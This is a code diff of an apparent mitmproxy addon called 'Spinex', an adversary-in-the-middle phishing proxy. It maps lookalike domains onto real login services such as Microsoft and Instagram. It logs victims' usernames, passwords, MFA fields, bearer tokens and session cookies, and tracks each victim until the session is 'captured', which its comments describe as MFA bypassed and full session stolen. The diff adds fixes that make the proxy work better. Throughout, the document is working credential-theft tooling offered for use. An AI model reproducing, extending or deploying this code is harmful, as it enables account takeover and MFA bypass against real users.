+    if not body_bytes or not can_rewrite:
         return
 
     charset = "utf-8"
@@ -1008,43 +722,31 @@ def _rewrite_response(flow: http.HTTPFlow) -> None:
     except (LookupError, UnicodeDecodeError):
         body_str = body_bytes.decode("utf-8", errors="replace")
 
-    # 5. Rewrite
     if ct_base in _HTML_TYPES:
         body_str = _rewrite_html(body_str)
     elif ct_base in _JS_TYPES:
         body_str = _rewrite_js(body_str)
     elif ct_base in _CSS_TYPES:
         body_str = _rewrite_css(body_str)
+    elif "json" in ct_base:
+        try:
+            parsed = json.loads(body_str)
+            rewritten = _rewrite_json(parsed)
+            body_str = json.dumps(rewritten, ensure_ascii=False)
+        except Exception:
+            body_str = _replace_domains(body_str)
     else:
         body_str = _replace_domains(body_str)
 
-    # 6. Write back
     flow.response.content = body_str.encode("utf-8", errors="replace")
     flow.response.headers["content-length"] = str(len(flow.response.content))
 
 
 # ---------------------------------------------------------------------------
-# SESSION STORE  (Step 5 — victim / session correlation)
-#
-# Every victim gets a unique session_id derived from their IP + User-Agent.
-# As credentials, cookies, and headers are captured across separate hooks,
-# they're all merged into one session record.
-#
-# Session status lifecycle:
-#   "new"       → first request seen, nothing captured yet
-#   "active"    → credentials (POST) or auth headers have been captured
-#   "captured"  → auth cookies received after credentials → MFA bypassed,
-#                  full session stolen — this is the terminal success state
-#
-# The in-memory store is flushed to disk (aitm_sessions.json) on every
-# meaningful update so progress isn't lost if mitmproxy is interrupted.
+# SESSION STORE
 # ---------------------------------------------------------------------------
 
 def _get_victim_ip(flow: http.HTTPFlow) -> str:
-    """
-    Return the real client IP.  Prefers X-Forwarded-For if present
-    (useful when mitmproxy sits behind a reverse proxy or load balancer).
-    """
     xff = flow.request.headers.get("x-forwarded-for", "")
     if xff:
         return xff.split(",")[0].strip()
@@ -1054,57 +756,11 @@ def _get_victim_ip(flow: http.HTTPFlow) -> str:
 
 
 def _make_session_id(ip: str, user_agent: str) -> str:
-    """
-    Derive a stable 16-char hex session ID from IP + User-Agent.
-    Collision probability is negligible for any realistic number of victims.
-    """
     fingerprint = f"{ip}::{user_agent}".encode("utf-8", errors="replace")
     return hashlib.sha256(fingerprint).hexdigest()[:16]
 
 
 class SessionStore:
-    """
-    Thread-safe in-memory store for victim session records.
-
-    Each record has the shape:
-    {
-        "id":          "a3f1c8e2b04d9f71",   # 16-char hex
-        "status":      "new|active|captured",
-        "ip":          "1.2.3.4",
-        "user_agent":  "Mozilla/5.0 ...",
-        "platform":    "microsoft",
-        "first_seen":  "2026-05-12 ...",
-        "last_seen":   "2026-05-12 ...",
-        "credentials": [                      # from Step 2 — POST bodies
-            {
-                "timestamp": "...",
-                "url":       "...",
-                "username":  {"loginfmt": "victim@company.com"},
-                "password":  {"passwd": "hunter2"},
-                "mfa":       {},
-            },
-            ...
-        ],
-        "cookies": [                          # from Step 1 — Set-Cookie headers
-            {
-                "timestamp": "...",
-                "url":       "...",
-                "cookies":   {"ESTSAUTH": {"value": "...", "platform": "microsoft"}},
-            },
-            ...
-        ],
-        "auth_headers": [                     # from Step 3 — outbound headers
-            {
-                "timestamp": "...",
-                "method":    "GET",
-                "url":       "...",
-                "headers":   {"authorization": {"scheme": "bearer", ...}},
-            },
-            ...
-        ],
-    }
-    """
-
     def __init__(self) -> None:
         self._store: dict[str, dict] = {}
         self._lock  = threading.Lock()
@@ -1113,7 +769,6 @@ class SessionStore:
         return str(datetime.datetime.now())
 
     def _get_or_create(self, flow: http.HTTPFlow) -> dict:
-        """Return the existing session record for this victim, or create one."""
         ip         = _get_victim_ip(flow)
         user_agent = flow.request.headers.get("user-agent", "unknown")
         sid        = _make_session_id(ip, user_agent)
@@ -1137,13 +792,6 @@ class SessionStore:
         return self._store[sid]
 
     def _advance_status(self, session: dict) -> None:
-        """
-        Promote status based on what's been collected so far.
-
-          has credentials AND has auth cookies → "captured"  (full session stolen)
-          has credentials OR  has auth headers → "active"    (in progress)
-          nothing yet                          → "new"
-        """
         has_creds   = bool(session["credentials"])
         has_cookies = bool(session["cookies"])
         has_headers = bool(session["auth_headers"])
@@ -1156,9 +804,7 @@ class SessionStore:
             session["status"] = "new"
 
     def _flush(self, session: dict) -> None:
-        """Write the current state of one session to disk (append/overwrite)."""
         try:
-            # Load existing sessions file into a dict keyed by session id
             existing: dict[str, dict] = {}
             if os.path.exists(LOG_SESSIONS):
                 with open(LOG_SESSIONS, "r") as f:
@@ -1171,10 +817,8 @@ class SessionStore:
                             except Exception:
                                 pass
 
-            # Overwrite this session's entry
             existing[session["id"]] = session
 
-            # Rewrite the whole file (keeps it as one-record-per-line JSONL)
             with open(LOG_SESSIONS, "w") as f:
                 for rec in existing.values():
                     f.write(json.dumps(rec) + "\n")
@@ -1182,14 +826,7 @@ class SessionStore:
         except Exception:
             traceback.print_exc()
 
-    def update_credentials(
-        self,
-        flow: http.HTTPFlow,
-        url: str,
-        platform: str,
-        captured: dict,
-    ) -> None:
-        """Record a POST credential capture and update session status."""
+    def update_credentials(self, flow, url, platform, captured):
         with self._lock:
             session = self._get_or_create(flow)
             if session["platform"] == "unknown" and platform != "unknown":
@@ -1205,14 +842,7 @@ class SessionStore:
             self._advance_status(session)
             self._flush(session)
 
-    def update_cookies(
-        self,
-        flow: http.HTTPFlow,
-        url: str,
-        platform: str,
-        auth_cookies: dict,
-    ) -> None:
-        """Record captured Set-Cookie tokens and update session status."""
+    def update_cookies(self, flow, url, platform, auth_cookies):
         with self._lock:
             session = self._get_or_create(flow)
             if session["platform"] == "unknown" and platform != "unknown":
@@ -1224,21 +854,11 @@ class SessionStore:
                 "cookies":   auth_cookies,
             })
             self._advance_status(session)
-
-            # Print a conspicuous alert when a session becomes fully captured
             if session["status"] == "captured":
                 _print_capture_alert(session)
-
             self._flush(session)
 
-    def update_auth_headers(
-        self,
-        flow: http.HTTPFlow,
-        url: str,
-        platform: str,
-        auth_headers: dict,
-    ) -> None:
-        """Record captured outbound auth headers and update session status."""
+    def update_auth_headers(self, flow, url, platform, auth_headers):
         with self._lock:
             session = self._get_or_create(flow)
             if session["platform"] == "unknown" and platform != "unknown":
@@ -1254,16 +874,11 @@ class SessionStore:
             self._flush(session)
 
     def get_all(self) -> list[dict]:
-        """Return a snapshot of all current session records."""
         with self._lock:
             return list(self._store.values())
 
 
 def _print_capture_alert(session: dict) -> None:
-    """
-    Print a highlighted alert to the mitmproxy console when a victim's
-    full session has been stolen (credentials + auth cookies both captured).
-    """
     sep = "=" * 60
     creds = session["credentials"][-1] if session["credentials"] else {}
     username_fields = creds.get("username", {})
@@ -1282,38 +897,66 @@ def _print_capture_alert(session: dict) -> None:
 
 SESSION_STORE = SessionStore()
 
-class AitmLogger:
-    """
-    mitmproxy addon — captures authentication credentials, headers, and session cookies.
 
-    Hooks:
-      request()  — fires before the request reaches the upstream server.
-                   • Step 2: Parses POST bodies for username / password / MFA fields.
-                   • Step 3: Inspects outbound headers for Bearer tokens, Basic auth,
-                             API keys, AWS signatures, and other auth headers.
-      response() — fires after the upstream server replies.
-                   • Step 1: Inspects Set-Cookie headers for session/auth tokens.
-    """
+class AitmLogger:
+    def load(self, loader):
+        print("[Spinex] AitmLogger addon loaded successfully")
 
     def request(self, flow: http.HTTPFlow) -> None:
         try:
-            host        = flow.request.pretty_host
-            url         = flow.request.url
+            host = flow.request.pretty_host
+            url  = flow.request.url
+
+            # =====================================================================
+            # FIX 1: Prevent proxy loopback to base domain
+            # If the victim requests the bare base domain (e.g. registration-portal.online)
+            # and it's NOT a mapped subdomain, mitmproxy would connect back to itself
+            # because DNS points to the same VPS IP. We block this with a 404.
+            # =====================================================================
+            if host in _BASE_DOMAINS and host not in _REVERSE_DOMAIN_MAP:
+                flow.response = http.Response.make(
+                    404,
+                    b"Not Found",
+                    {"content-type": "text/plain"}
+                )
+                print(f"[Spinex] Blocked loopback request to base domain: {host}")
+                return
+
+            # =====================================================================
+            # FIX 2: Rewrite proxy domain -> real upstream domain
+            # Must happen BEFORE any logging so the connection goes to the
+            # correct upstream server.
+            # =====================================================================
+            original_host = host
             if host in _REVERSE_DOMAIN_MAP:
                 real_host = _REVERSE_DOMAIN_MAP[host]
-                print(f"[Spinex] Rewriting: {host} → {real_host}")
+                print(f"[Spinex] Rewriting upstream: {host} -> {real_host}")
                 flow.request.host = real_host
                 flow.request.headers["Host"] = real_host
-            platforms   = _match_platform(host)
-            h_platforms = _match_header_platform(host)
 
+                # HTTP/2 :authority pseudo-header must also be updated
+                if ":authority" in flow.request.headers:
+                    flow.request.headers[":authority"] = real_host
+
+                # Keep original host in a custom header for debugging
+                flow.request.headers["X-Spinex-Original-Host"] = original_host
+
+            # Use the REAL host for platform matching (so Instagram cookies
+            # match the Instagram registry even though the victim sees the proxy)
+            upstream_host = flow.request.host
+
+            platforms   = _match_platform(upstream_host)
+            h_platforms = _match_header_platform(upstream_host)
+
+            # Step 3: Auth headers
             auth_headers = _extract_auth_headers(flow, h_platforms)
             if auth_headers:
                 platform = h_platforms[0] if h_platforms else "unknown"
                 header_entry = {
                     "timestamp": str(datetime.datetime.now()),
                     "method":    flow.request.method,
-                    "host":      host,
+                    "host":      upstream_host,
+                    "proxy_host": original_host if original_host != upstream_host else upstream_host,
                     "url":       url,
                     "platform":  platform,
                     "headers":   auth_headers,
@@ -1321,6 +964,7 @@ class AitmLogger:
                 _append_log(LOG_HEADERS, header_entry)
                 SESSION_STORE.update_auth_headers(flow, url, platform, auth_headers)
 
+            # Step 2: POST credential capture
             if flow.request.method.upper() != "POST":
                 return
 
@@ -1343,7 +987,8 @@ class AitmLogger:
             platform = platforms[0] if platforms else "unknown"
             entry = {
                 "timestamp": str(datetime.datetime.now()),
-                "host":      host,
+                "host":      upstream_host,
+                "proxy_host": original_host if original_host != upstream_host else upstream_host,
                 "url":       url,
                 "platform":  platform,
                 "creds":     {
@@ -1360,8 +1005,9 @@ class AitmLogger:
 
     def response(self, flow: http.HTTPFlow) -> None:
         try:
-            host = flow.request.pretty_host
-            url = flow.request.url
+            # Use the upstream host (already rewritten in request hook)
+            host   = flow.request.host
+            url    = flow.request.url
             status = flow.response.status_code
 
             print(f"[Spinex] Response from {host} | Status: {status} | URL: {url}")
@@ -1416,7 +1062,7 @@ class AitmLogger:
             print(f"[Spinex] Successfully processed response from {host}")
 
         except Exception as e:
-            print(f"[Spinex] Response processing error for {host}: {e}")
+            print(f"[Spinex] Response processing error: {e}")
             traceback.print_exc()
 
 
